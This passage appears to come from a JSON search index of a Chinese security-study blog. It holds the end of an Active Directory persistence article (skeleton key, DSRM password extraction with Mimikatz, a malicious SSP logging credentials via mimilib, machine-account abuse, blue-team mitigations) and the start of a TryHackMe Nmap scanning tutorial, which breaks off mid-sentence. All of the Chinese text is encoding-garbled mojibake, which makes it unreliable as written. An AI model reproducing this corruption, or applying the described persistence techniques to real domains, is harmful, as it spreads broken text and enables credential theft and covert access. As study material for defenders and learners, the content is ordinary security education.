key)ï¼Œè¯¥ä¸‡èƒ½é’¥åŒ™å¯ç”¨äºæ¨¡æ‹Ÿæ¨¡æ¿ADåŸŸä¸­çš„ä»»ä½•å¸æˆ·ï¼›Mimikatzä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤å¯†ç ï¼Œå¹¶å°†å…¶é€‚ç”¨äºç›®æ ‡ADåŸŸä¸­çš„ä»»ä½•å¸æˆ·ï¼Œä½†æ˜¯åŸå…ˆçš„æ™®é€šå¯†ç ä»ç„¶æœ‰æ•ˆï¼Œå› æ­¤é˜²å¾¡è€…å¾ˆéš¾çŸ¥é“è¿™ç§æ”»å‡»å·²ç»å‘ç”Ÿã€‚ Directory Service Restore Mode (DSRM)ï¼šæ¯ä¸ªåŸŸæ§åˆ¶å™¨ä¸­éƒ½æœ‰ä¸€ä¸ªè¢«ç§°ä¸ºDSRMçš„å†…éƒ¨å¯ç”¨çš„ç®¡ç†å‘˜å¸æˆ·ï¼ŒDSRMå¸æˆ·çš„å¯†ç å°†åœ¨æœåŠ¡å™¨å‡çº§ä¸ºDCæ—¶è®¾ç½®ï¼Œå¹¶ä¸”å¾ˆå°‘ä¼šå‘ç”Ÿä¿®æ”¹ï¼Œè¯¥å¯†ç èƒ½å¤Ÿç”¨äºåœ¨ç´§æ€¥æƒ…å†µä¸‹æ¢å¤DCï¼›è€Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨Mimikatzæ¥æå–DSRMå¸æˆ·çš„å¯†ç ï¼Œå¹¶ä½¿ç”¨æ­¤å¯†ç è·å¾—é’ˆå¯¹ç›®æ ‡ADç¯å¢ƒä¸­çš„åŸŸæ§åˆ¶å™¨(DC)çš„ç®¡ç†åŠè®¿é—®æƒé™ã€‚ Malicious Security Support Provider (SSP)ï¼šåˆ©ç”¨SSPæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å°†Mimikatzçš„mimilibæ·»åŠ ä¸ºæ–°çš„SSPï¼Œè¿™ä¼šå°†ç›®æ ‡åŸŸä¸­çš„æ‰€æœ‰èº«ä»½éªŒè¯å°è¯•çš„å‡­æ®éƒ½è®°å½•åˆ°ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ï¼›æˆ‘ä»¬å¯ä»¥æŒ‡å®šç”¨äºæ—¥å¿—è®°å½•çš„ç½‘ç»œä½ç½®ï¼Œè¿™å°†å…è®¸mimilibæŠŠæˆ‘ä»¬çš„å‡­æ®å‘é€ç»™è¢«å…¥ä¾µçš„åŸŸå†…ä¸»æœºå¹¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œä¸ºæˆ‘ä»¬æä¾›æŒä¹…åŒ–çš„è®¿é—®æƒé™ã€‚ Computer Accountsï¼šæœºå™¨(è®¡ç®—æœº)å¸æˆ·çš„å¯†ç é€šå¸¸ä¼šæ¯30å¤©è½®æ¢ä¸€æ¬¡ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹æœºå™¨å¸æˆ·çš„å¯†ç è®¾ç½®ï¼Œè®©å®ƒåœæ­¢è‡ªåŠ¨è½®æ¢ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æˆäºˆæœºå™¨å¸æˆ·å¯¹äºå…¶ä»–åŸŸå†…ä¸»æœºçš„ç®¡ç†åŠè®¿é—®æƒé™ï¼Œè¿™å°†å…è®¸æˆ‘ä»¬å°†è®¡ç®—æœºå¸æˆ·ä½œä¸ºåŸŸå†…çš„å…¶ä»–ADå¸æˆ·ä½¿ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°è¯•è®©è¯¥å¸æˆ·å¯¹å…¶ä»–ä¸»æœºä¹Ÿå…·æœ‰ç®¡ç†æƒé™å³å¯ï¼Œè€Œä¸”è¿™åœ¨ADåŸŸä¸­é€šå¸¸æ˜¯æ­£å¸¸çš„è¡Œä¸ºï¼Œå› æ­¤ç›¸å…³æ“ä½œå¯èƒ½ä¸ä¼šè¢«è“é˜Ÿè®¤ä¸ºæ˜¯æ¶æ„è¡Œä¸ºã€‚ æˆ‘ä»¬è¿˜åº”è¯¥æ³¨æ„åˆ°ï¼Œæœ¬æ–‡çš„é‡ç‚¹æ˜¯ADåŸŸä¸­çš„æƒé™ç»´æŒæŠ€æœ¯ï¼Œè€Œæœ¬åœ°æƒé™ç»´æŒæŠ€æœ¯ä»…å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ä¸»æœºä¸Šå®ç°æƒé™æŒä¹…åŒ–ï¼Œä½†æ˜¯å¦‚æœè¿™äº›ç›®æ ‡ä¸»æœºæ˜¯åœ¨ç›®æ ‡ADåŸŸå†…çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æœ¬åœ°æƒé™ç»´æŒæ¥å®ç°é’ˆå¯¹ç›®æ ‡ADåŸŸçš„æƒé™ç»´æŒã€‚ ç¼“è§£åŸŸæƒé™ç»´æŒå¨èƒçš„æªæ–½ è“é˜Ÿåº”è¯¥å¦‚ä½•é˜²å¾¡è¿™äº›é’ˆå¯¹ADåŸŸçš„æƒé™ç»´æŒæŠ€æœ¯å‘¢ï¼Ÿåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…æ‰€æ‰§è¡Œçš„æƒé™ç»´æŒè®¾ç½®å¯èƒ½æ ¹æ·±è’‚å›ºï¼Œä»¥è‡³äºè“é˜Ÿéœ€è¦é‡æ–°æ„å»ºå®Œæ•´çš„åŸŸæ‰èƒ½å¤Ÿå®Œå…¨æ¸…ç†æƒé™ç»´æŒè®¾ç½®ï¼›åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè“é˜Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ“ä½œæ¥æ£€æµ‹ç”±æ”»å‡»è€…æ‰€éƒ¨ç½²çš„æƒé™ç»´æŒè®¾ç½®ï¼š æ£€æµ‹å¼‚å¸¸å¸æˆ·çš„ç™»å½•äº‹ä»¶ï¼Œå½“ADåŸŸçš„åˆ†å±‚æ¨¡å‹è¢«ç”¨æˆ·å‡­æ®æ‰€ç ´åæ—¶ï¼Œåˆ™å¯èƒ½æ˜¯æ”»å‡»è€…ä½¿ç”¨äº†åŸŸæƒé™ç»´æŒæŠ€æœ¯çš„ç»“æœã€‚ å¯¹äºä¸Šæ–‡æ‰€æåˆ°çš„æ¯ä¸€ç§åŸŸæƒé™ç»´æŒæŠ€æœ¯ï¼Œè“é˜Ÿéƒ½å¯ä»¥ç¼–å†™ç‰¹å®šçš„æ£€æµ‹è§„åˆ™ï¼Œä¾‹å¦‚è“é˜Ÿå¯ä»¥æ£€æµ‹æœºå™¨å¸æˆ·çš„å¯†ç æ›´æ”¹ã€è¢«å…è®¸æ›´æ–°çš„ACLã€æ˜¯å¦åˆ›å»ºäº†æ–°çš„GPOç­‰ã€‚ ç”¨äºå¯¹æŠ—åŸŸæƒé™ç»´æŒçš„æœ€ä½³æ–¹æ³•æ˜¯ä¿æŠ¤ç‰¹æƒèµ„æºï¼Œå°½ç®¡æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä½ç‰¹æƒè®¿é—®æƒé™æ¥éƒ¨ç½²åŸŸæƒé™ç»´æŒè®¾ç½®ï¼Œä½†æ˜¯çœŸæ­£å¯æ€•çš„åŸŸæƒé™ç»´æŒæŠ€æœ¯åªæœ‰åœ¨æ”»å‡»è€…è·å¾—é’ˆå¯¹ç›®æ ‡ADåŸŸçš„é«˜çº§è®¿é—®ç‰¹æƒåæ‰å¯ä»¥è¢«ä½¿ç”¨ã€‚ æœ¬æ–‡åªæ˜¯ä¸€ä¸ªç®€å•çš„æŠ€æœ¯ä»‹ç»ï¼Œå…³äºADåŸŸçš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆå¤šåœ°æ–¹éœ€è¦å­¦ä¹ ã€‚","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Nmap","path":"/2024/02/16/thm-nmap/","content":"0x01 ç®€ä»‹ å¯¹äºé»‘å®¢æ¥è¯´ï¼ŒçŸ¥è¯†å°±æ˜¯åŠ›é‡ã€‚æ‚¨å¯¹ç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œçš„äº†è§£è¶Šå¤šï¼Œå¯ç”¨çš„é€‰é¡¹å°±è¶Šå¤šã€‚è¿™ä½¿å¾—åœ¨è¿›è¡Œä»»ä½•åˆ©ç”¨å°è¯•ä¹‹å‰å¿…é¡»è¿›è¡Œé€‚å½“çš„æšä¸¾ã€‚ å‡è®¾æˆ‘ä»¬å·²è·å¾—ä¸€ä¸ª IPï¼ˆæˆ–å¤šä¸ª IP åœ°å€ï¼‰æ¥æ‰§è¡Œå®‰å…¨å®¡æ ¸ã€‚åœ¨æˆ‘ä»¬åšä»»ä½•å…¶ä»–äº‹æƒ…ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£æˆ‘ä»¬æ­£åœ¨æ”»å‡»çš„â€œæ™¯è§‚â€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦ç¡®å®šç›®æ ‡ä¸Šæ­£åœ¨è¿è¡Œå“ªäº›æœåŠ¡ã€‚ ä¾‹å¦‚ï¼Œä¹Ÿè®¸å…¶ä¸­ä¸€ä¸ªæ­£åœ¨è¿è¡Œ Web æœåŠ¡å™¨ï¼Œå¦ä¸€ä¸ªåˆ™å……å½“ Windows Active Directory åŸŸæ§åˆ¶å™¨ã€‚å»ºç«‹æ™¯è§‚â€œåœ°å›¾â€çš„ç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯æ‰€è°“çš„ç«¯å£æ‰«æã€‚å½“è®¡ç®—æœºè¿è¡Œç½‘ç»œæœåŠ¡æ—¶ï¼Œå®ƒä¼šæ‰“å¼€ä¸€ä¸ªç§°ä¸ºâ€œç«¯å£â€çš„ç½‘ç»œç»“æ„æ¥æ¥æ”¶è¿æ¥ã€‚ç«¯å£å¯¹äºå‘å‡ºå¤šä¸ªç½‘ç»œè¯·æ±‚æˆ–æä¾›å¤šä¸ªå¯ç”¨æœåŠ¡æ˜¯å¿…éœ€çš„ã€‚ ä¾‹å¦‚ï¼Œå½“æ‚¨åœ¨ç½‘ç»œæµè§ˆå™¨ä¸­åŒæ—¶åŠ è½½å¤šä¸ªç½‘é¡µæ—¶ï¼Œç¨‹åºå¿…é¡»æœ‰æŸç§æ–¹æ³•æ¥ç¡®å®šå“ªä¸ªé€‰é¡¹å¡æ­£åœ¨åŠ è½½å“ªä¸ªç½‘é¡µã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨æœ¬åœ°è®¡ç®—æœºä¸Šçš„ä¸åŒç«¯å£å»ºç«‹ä¸è¿œç¨‹ç½‘ç»œæœåŠ¡å™¨çš„è¿æ¥æ¥å®Œæˆçš„ã€‚åŒæ ·ï¼Œå¦‚æœæ‚¨å¸Œæœ›ä¸€å°æœåŠ¡å™¨èƒ½å¤Ÿè¿è¡Œå¤šä¸ªæœåŠ¡ï¼ˆä¾‹å¦‚ï¼Œæ‚¨å¯èƒ½å¸Œæœ›æ‚¨çš„ Web æœåŠ¡å™¨åŒæ—¶è¿è¡Œè¯¥ç«™ç‚¹çš„ HTTP å’Œ HTTPS ç‰ˆæœ¬ï¼‰ï¼Œé‚£ä¹ˆæ‚¨éœ€è¦æŸç§æ–¹æ³•å°†æµé‡å¼•å¯¼è‡³é€‚å½“çš„æœåŠ¡ã€‚ç«¯å£å†æ¬¡æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•ã€‚ç½‘ç»œè¿æ¥æ˜¯åœ¨ä¸¤ä¸ªç«¯å£ä¹‹é—´å»ºç«‹çš„ - ä¸€ä¸ªåœ¨æœåŠ¡å™¨ä¸Šä¾¦å¬çš„å¼€æ”¾ç«¯å£å’Œä¸€ä¸ªåœ¨æ‚¨è‡ªå·±çš„è®¡ç®—æœºä¸Šéšæœºé€‰æ‹©çš„ç«¯å£ã€‚ä¾‹å¦‚ï¼Œå½“æ‚¨è¿æ¥åˆ°ç½‘é¡µæ—¶ï¼Œæ‚¨çš„è®¡ç®—æœºå¯èƒ½ä¼šæ‰“å¼€ç«¯å£ 49534 ä»¥è¿æ¥åˆ°æœåŠ¡å™¨çš„ç«¯å£ 443ã€‚ ä¸å‰é¢çš„ç¤ºä¾‹ä¸€æ ·ï¼Œè¯¥å›¾æ˜¾ç¤ºäº†å½“æ‚¨åŒæ—¶è¿æ¥åˆ°å¤šä¸ªç½‘ç«™æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µã€‚æ‚¨çš„è®¡ç®—æœºæ‰“å¼€ä¸€ä¸ªä¸åŒçš„é«˜ç¼–å·ç«¯å£ï¼ˆéšæœºï¼‰ï¼Œç”¨äºä¸è¿œç¨‹æœåŠ¡å™¨çš„æ‰€æœ‰é€šä¿¡ã€‚ æ¯å°è®¡ç®—æœºå…±æœ‰65535ä¸ªå¯ç”¨ç«¯å£ï¼›ç„¶è€Œï¼Œå…¶ä¸­è®¸å¤šå·²æ³¨å†Œä¸ºæ ‡å‡†ç«¯å£ã€‚ä¾‹å¦‚ï¼ŒHTTP Web æœåŠ¡å‡ ä¹æ€»æ˜¯å¯ä»¥åœ¨æœåŠ¡å™¨çš„ç«¯å£ 80 ä¸Šæ‰¾åˆ°ã€‚ HTTPS Web æœåŠ¡å¯ä»¥åœ¨ç«¯å£ 443 ä¸Šæ‰¾åˆ°ã€‚Windows NETBIOS å¯ä»¥åœ¨ç«¯å£ 139 ä¸Šæ‰¾åˆ°ï¼ŒSMB å¯ä»¥åœ¨ç«¯å£ 445 ä¸Šæ‰¾åˆ°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼›ç„¶è€Œï¼Œç‰¹åˆ«æ˜¯åœ¨ CTF è®¾ç½®ä¸­ï¼Œå³ä½¿è¿™äº›æ ‡å‡†ç«¯å£è¢«æ›´æ”¹ä¹Ÿå¹¶éé—»æ‰€æœªé—»ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ›´æœ‰å¿…è¦å¯¹ç›®æ ‡æ‰§è¡Œé€‚å½“çš„æšä¸¾ã€‚ å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æœåŠ¡å™¨æ‰“å¼€äº†å“ªäº›ç«¯å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ²¡æœ‰æˆåŠŸæ”»å‡»ç›®æ ‡çš„å¸Œæœ›ï¼›å› æ­¤ï¼Œæˆ‘ä»¬ä»ç«¯å£æ‰«æå¼€å§‹ä»»ä½•æ”»å‡»è‡³å…³é‡è¦ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ¥å®Œæˆâ€”â€”é€šå¸¸ä½¿ç”¨åä¸º nmap çš„å·¥å…·ï¼Œè¿™æ˜¯æœ¬â€‹â€‹æ¬¡ä¼šè®®çš„é‡ç‚¹ã€‚ Nmap å¯ç”¨äºæ‰§è¡Œè®¸å¤šä¸åŒç±»å‹çš„ç«¯å£æ‰«æ - å…¶ä¸­æœ€å¸¸è§çš„å°†åœ¨æ¥ä¸‹æ¥çš„ä»»åŠ¡ä¸­ä»‹ç»ï¼›ç„¶è€Œï¼ŒåŸºæœ¬ç†è®ºæ˜¯è¿™æ ·çš„ï¼šnmap å°†ä¾æ¬¡è¿æ¥åˆ°ç›®æ ‡çš„æ¯ä¸ªç«¯å£ã€‚æ ¹æ®ç«¯å£çš„å“åº”æ–¹å¼ï¼Œå¯ä»¥å°†å…¶ç¡®å®šä¸ºå¼€æ”¾ã€å…³é—­æˆ–è¿‡æ»¤ï¼ˆé€šå¸¸ç”±é˜²ç«å¢™ï¼‰ã€‚ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å“ªäº›ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹æ¯ä¸ªç«¯å£ä¸Šæ­£åœ¨è¿è¡Œçš„æœåŠ¡â€”â€”æ‰‹åŠ¨ï¼Œæˆ–è€…æ›´å¸¸è§çš„æ˜¯ä½¿ç”¨ nmapã€‚ é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆæ˜¯ nmapï¼Ÿç®€è€Œè¨€ä¹‹ï¼Œå®ƒç›®å‰æˆä¸ºè¡Œä¸šæ ‡å‡†æ˜¯æœ‰åŸå› çš„ï¼šæ²¡æœ‰å…¶ä»–ç«¯å£æ‰«æå·¥å…·èƒ½å¤Ÿæ¥è¿‘å…¶åŠŸèƒ½ï¼ˆå°½ç®¡ä¸€äº›æ–°æ¥è€…ç°åœ¨åœ¨é€Ÿåº¦ä¸Šä¸å®ƒç›¸åŒ¹é…ï¼‰ã€‚å®ƒæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…· - å…¶è„šæœ¬å¼•æ“ä½¿å…¶æ›´åŠ å¼ºå¤§ï¼Œå¯ç”¨äºæ‰«ææ¼æ´ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ç”šè‡³å¯ä»¥ç›´æ¥æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼å†æ¬¡ï¼Œè¿™å°†åœ¨æ¥ä¸‹æ¥çš„ä»»åŠ¡ä¸­æ›´å¤šåœ°æ¶‰åŠã€‚ ç°åœ¨ï¼Œäº†è§£ä»¥ä¸‹å†…å®¹å¾ˆé‡è¦ï¼šä»€ä¹ˆæ˜¯ç«¯å£æ‰«æï¼›ä¸ºä»€ä¹ˆæœ‰å¿…è¦ï¼› nmap æ˜¯ä»»ä½•ç±»å‹åˆå§‹æšä¸¾çš„é¦–é€‰å·¥å…·ã€‚ 0x02 Nmapé€‰é¡¹ ä¸å¤§å¤šæ•°æ¸—é€æµ‹è¯•å·¥å…·ä¸€æ ·ï¼Œnmap æ˜¯ä»ç»ˆç«¯è¿è¡Œçš„ã€‚æœ‰é€‚ç”¨äº Windows å’Œ Linux çš„ç‰ˆæœ¬ã€‚å¯¹äºè¿™ä¸ªæˆ¿é—´ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨ä½¿ç”¨çš„æ˜¯ Linuxï¼›ä½†æ˜¯ï¼Œå¼€å…³åº”è¯¥æ˜¯ç›¸åŒçš„ã€‚ Nmap é»˜è®¤å®‰è£…åœ¨ Kali Linux å’Œ TryHackMe Attack Box ä¸­ã€‚ å¯ä»¥é€šè¿‡åœ¨ç»ˆç«¯å‘½ä»¤è¡Œä¸­è¾“å…¥ nmap æ¥è®¿é—® Nmapï¼Œç„¶åè¾“å…¥æˆ‘ä»¬å°†åœ¨ä¸‹é¢ä»‹ç»çš„ä¸€äº›â€œå¼€å…³â€ï¼ˆå‘Šè¯‰ç¨‹åºæ‰§è¡Œä¸åŒæ“ä½œçš„å‘½ä»¤å‚æ•°ï¼‰ã€‚ ä¸ºæ­¤ï¼Œæ‚¨æ‰€éœ€è¦çš„åªæ˜¯ nmap çš„å¸®åŠ©èœå•ï¼ˆä½¿ç”¨ nmap -h è®¿é—®ï¼‰å’Œ/æˆ– nmap æ‰‹å†Œé¡µï¼ˆä½¿ç”¨ man nmap è®¿é—®ï¼‰ã€‚å¯¹äºæ¯ä¸ªç­”æ¡ˆï¼Œé™¤éå¦æœ‰è¯´æ˜ï¼Œå¦åˆ™è¯·åŒ…æ‹¬å¼€å…³çš„æ‰€æœ‰éƒ¨åˆ†ã€‚è¿™åŒ…æ‹¬å¼€å¤´çš„è¿å­—ç¬¦ ( - )ã€‚ 0x03 æ‰«æç±»å‹æ¦‚è¿° ä½¿ç”¨Nmapè¿›è¡Œç«¯å£æ‰«ææ—¶ï¼Œæœ‰ä¸‰ç§åŸºæœ¬æ‰«æç±»å‹ã€‚è¿™äº›éƒ½æ˜¯ï¼š TCP è¿æ¥æ‰«æ ( -sT ) SYNâ€œåŠå¼€â€æ‰«æ ( -sS ) UDP æ‰«æ ( -sU ) æ­¤å¤–ï¼Œè¿˜æœ‰å‡ ç§ä¸å¤ªå¸¸è§çš„ç«¯å£æ‰«æç±»å‹ï¼Œæˆ‘ä»¬è¿˜å°†ä»‹ç»å…¶ä¸­ä¸€äº›ç±»å‹ï¼ˆå°½ç®¡ä¸å¤ªè¯¦ç»†ï¼‰ã€‚è¿™äº›éƒ½æ˜¯ï¼š TCP ç©ºæ‰«æ ( -sN ) TCP FIN æ‰«æ ( -sF ) TCP åœ£è¯èŠ‚æ‰«æ ( -sX ) å…¶ä¸­å¤§å¤šæ•°ï¼ˆUDP æ‰«æé™¤å¤–ï¼‰çš„ç”¨é€”éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯æ¯æ¬¡æ‰«æçš„å·¥ä½œæ–¹å¼æœ‰æ‰€ä¸åŒã€‚è¿™æ„å‘³ç€ï¼Œè™½ç„¶åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ‚¨å¯èƒ½ä¼šé€‰æ‹©å‰ä¸‰ç§æ‰«æä¹‹ä¸€ï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯è¿˜å­˜åœ¨å…¶ä»–æ‰«æç±»å‹ã€‚ åœ¨ç½‘ç»œæ‰«ææ–¹é¢ï¼Œæˆ‘ä»¬è¿˜å°†ç®€è¦ä»‹ç»ä¸€ä¸‹ ICMPï¼ˆæˆ–â€œpingâ€ï¼‰æ‰«æã€‚ 0x04 TCP æ‰«æ è¦äº†è§£ TCP è¿æ¥æ‰«æ ( -sT )ï¼Œç†Ÿæ‚‰ TCP ä¸‰å‘æ¡æ‰‹éå¸¸é‡è¦ã€‚å¦‚æœæ‚¨å¯¹è¿™ä¸ªæœ¯è¯­æ¯”è¾ƒé™Œç”Ÿï¼Œé‚£ä¹ˆå»ºè®®æ‚¨å…ˆå®Œæˆç½‘ç»œä»‹ç»ï¼Œç„¶åå†ç»§ç»­ã€‚ ç®€è¦å›é¡¾ä¸€ä¸‹ï¼Œä¸‰å‘æ¡æ‰‹ç”±ä¸‰ä¸ªé˜¶æ®µç»„æˆã€‚é¦–å…ˆï¼Œè¿æ¥ç»ˆç«¯ï¼ˆåœ¨æœ¬ä¾‹ä¸­æ˜¯æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ï¼‰å‘ç›®æ ‡æœåŠ¡å™¨å‘é€ä¸€ä¸ªè®¾ç½®äº† SYN æ ‡å¿—çš„ TCP è¯·æ±‚ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä½¿ç”¨åŒ…å« SYN æ ‡å¿—ä»¥åŠ ACK æ ‡å¿—çš„ TCP å“åº”æ¥ç¡®è®¤è¯¥æ•°æ®åŒ…ã€‚æœ€åï¼Œæˆ‘ä»¬çš„ç»ˆç«¯é€šè¿‡å‘é€è®¾ç½®äº† ACK æ ‡å¿—çš„ TCP è¯·æ±‚æ¥å®Œæˆæ¡æ‰‹ã€‚ è¿™æ˜¯ TCP/IP ç½‘ç»œçš„åŸºæœ¬åŸåˆ™ä¹‹ä¸€ï¼Œä½†å®ƒä¸ Nmap æœ‰ä½•å…³ç³»ï¼Ÿ é¡¾åæ€ä¹‰ï¼ŒTCP Connect æ‰«æçš„å·¥ä½œåŸç†æ˜¯ä¾æ¬¡ä¸æ¯ä¸ªç›®æ ‡ç«¯å£æ‰§è¡Œä¸‰å‘æ¡æ‰‹ã€‚æ¢å¥è¯è¯´ï¼ŒNmap å°è¯•è¿æ¥åˆ°æ¯ä¸ªæŒ‡å®šçš„ TCP ç«¯å£ï¼Œå¹¶é€šè¿‡æ”¶åˆ°çš„å“åº”æ¥ç¡®å®šæœåŠ¡æ˜¯å¦æ‰“å¼€ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœç«¯å£å…³é—­ï¼ŒRFC 9293 æŒ‡å‡ºï¼š â€œâ€¦å¦‚æœè¿æ¥ä¸å­˜åœ¨ï¼ˆå…³é—­ï¼‰ï¼Œåˆ™å°†å‘é€é‡ç½®ä»¥å“åº”é™¤å¦ä¸€ä¸ªé‡ç½®ä¹‹å¤–çš„ä»»ä½•ä¼ å…¥åˆ†æ®µã€‚é€šè¿‡è¿™ç§æ–¹å¼æ‹’ç»ä¸ç°æœ‰è¿æ¥ä¸åŒ¹é…çš„ SYN åˆ†æ®µã€‚â€ æ¢å¥è¯è¯´ï¼Œå¦‚æœNmapå‘å…³é—­çš„ç«¯å£å‘é€è®¾ç½®äº†SYNæ ‡å¿—çš„TCPè¯·æ±‚ï¼Œç›®æ ‡æœåŠ¡å™¨å°†ä½¿ç”¨è®¾ç½®äº†RSTï¼ˆé‡ç½®ï¼‰æ ‡å¿—çš„TCPæ•°æ®åŒ…è¿›è¡Œå“åº”ã€‚é€šè¿‡æ­¤å“åº”ï¼ŒNmap å¯ä»¥ç¡®å®šç«¯å£å·²å…³é—­ã€‚ ä½†æ˜¯ï¼Œå¦‚æœè¯·æ±‚å‘é€åˆ°å¼€æ”¾ç«¯å£ï¼Œç›®æ ‡å°†ä½¿ç”¨è®¾ç½®äº† SYN/ACK æ ‡å¿—çš„ TCP æ•°æ®åŒ…è¿›è¡Œå“åº”ã€‚ç„¶åï¼ŒNmap å°†æ­¤ç«¯å£æ ‡è®°ä¸ºæ‰“å¼€ï¼ˆå¹¶é€šè¿‡å‘å›è®¾ç½®äº† ACK çš„ TCP æ•°æ®åŒ…æ¥å®Œæˆæ¡æ‰‹ï¼‰ã€‚ è¿™ä¸€åˆ‡éƒ½å¾ˆå¥½ï¼Œä½†æ˜¯ï¼Œè¿˜æœ‰ç¬¬ä¸‰ç§å¯èƒ½æ€§ã€‚ å¦‚æœç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†éšè—åœ¨é˜²ç«å¢™åé¢æ€ä¹ˆåŠï¼Ÿ è®¸å¤šé˜²ç«å¢™é…ç½®ä¸ºç®€å•åœ°ä¸¢å¼ƒä¼ å…¥æ•°æ®åŒ…ã€‚ Nmap å‘é€ TCP SYN è¯·æ±‚ï¼Œä½†æ²¡æœ‰æ”¶åˆ°ä»»ä½•å›å¤ã€‚è¿™è¡¨æ˜è¯¥ç«¯å£å—åˆ°é˜²ç«å¢™ä¿æŠ¤ï¼Œå› æ­¤è¯¥ç«¯å£è¢«è§†ä¸ºè¢«è¿‡æ»¤ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œé…ç½®é˜²ç«å¢™ä»¥å“åº” RST TCP æ•°æ®åŒ…éå¸¸å®¹æ˜“ã€‚ä¾‹å¦‚ï¼Œåœ¨ Linux çš„ IPtables ä¸­ï¼Œå‘½ä»¤çš„ç®€å•ç‰ˆæœ¬å¦‚ä¸‹ï¼š iptables -I INPUT -p tcp --dport &lt;port&gt; -j REJECT --reject-with tcp-reset è¿™ä½¿å¾—è·å¾—ç›®æ ‡çš„å‡†ç¡®è¯»æ•°å˜å¾—æå…¶å›°éš¾ï¼ˆå¦‚æœä¸æ˜¯ä¸å¯èƒ½çš„è¯ï¼‰ã€‚ 0x05 SYN æ‰«æ ä¸ TCP æ‰«æä¸€æ ·ï¼ŒSYN æ‰«æ ( -sS ) ç”¨äºæ‰«æä¸€ä¸ªæˆ–å¤šä¸ªç›®æ ‡çš„ TCP ç«¯å£èŒƒå›´ï¼›ç„¶è€Œï¼Œè¿™ä¸¤ç§æ‰«æç±»å‹çš„å·¥ä½œæ–¹å¼ç•¥æœ‰ä¸åŒã€‚ SYN æ‰«ææœ‰æ—¶ç§°ä¸ºâ€œåŠå¼€æ”¾â€æ‰«ææˆ–â€œéšå½¢â€æ‰«æã€‚ TCP æ‰«æä¸ç›®æ ‡æ‰§è¡Œå®Œæ•´çš„ä¸‰å‘æ¡æ‰‹ï¼ŒSYN æ‰«æåœ¨ä»æœåŠ¡å™¨æ¥æ”¶åˆ° SYN/ACK åå‘å› RST TCP æ•°æ®åŒ…ï¼ˆè¿™å¯ä»¥é˜²æ­¢æœåŠ¡å™¨é‡å¤å°è¯•å‘å‡ºè¯·æ±‚ï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œæ‰«æå¼€æ”¾ç«¯å£çš„é¡ºåºå¦‚ä¸‹æ‰€ç¤ºï¼š è¿™å¯¹äºæˆ‘ä»¬é»‘å®¢æ¥è¯´æœ‰å¾ˆå¤šå¥½å¤„ï¼š å®ƒå¯ç”¨äºç»•è¿‡æ—§çš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå› ä¸ºå®ƒä»¬æ­£åœ¨å¯»æ‰¾å®Œæ•´çš„ä¸‰å‘æ¡æ‰‹ã€‚ç°ä»£ IDS è§£å†³æ–¹æ¡ˆé€šå¸¸ä¸å†å‡ºç°è¿™ç§æƒ…å†µï¼›æ­£æ˜¯ç”±äºè¿™ä¸ªåŸå› ï¼ŒSYN æ‰«æä»ç„¶ç»å¸¸è¢«ç§°ä¸ºâ€œéšå½¢â€æ‰«æã€‚ ä¾¦å¬å¼€æ”¾ç«¯å£çš„åº”ç”¨ç¨‹åºé€šå¸¸ä¸ä¼šè®°å½• SYN æ‰«æï¼Œå› ä¸ºæ ‡å‡†åšæ³•æ˜¯åœ¨å®Œå…¨å»ºç«‹è¿æ¥åè®°å½•è¿æ¥ã€‚è¿™å†æ¬¡ä½“ç°äº† SYN æ‰«æçš„éšç§˜æ€§ã€‚ æ— éœ€è´¹å¿ƒä¸ºæ¯ä¸ªç«¯å£å®Œæˆï¼ˆå’Œæ–­å¼€è¿æ¥ï¼‰ä¸‰å‘æ¡æ‰‹ï¼ŒSYN æ‰«ææ¯”æ ‡å‡† TCP è¿æ¥æ‰«æè¦å¿«å¾—å¤šã€‚ ç„¶è€Œï¼ŒSYN 